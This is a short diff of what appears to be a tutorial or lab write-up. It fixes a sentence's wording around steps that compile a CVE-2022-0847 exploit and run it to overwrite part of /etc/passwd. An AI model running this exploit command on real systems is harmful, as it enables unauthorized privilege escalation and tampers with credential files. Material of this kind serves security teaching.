@@ -103,7 +103,7 @@ In the Machine, we must compilate it
 gcc CVE-2022-0847.c -o cve
 ```
 
-Now it execute it
+Now let's execute it
 ```
 ./cve /etc/passwd 1 ootz:
 ```
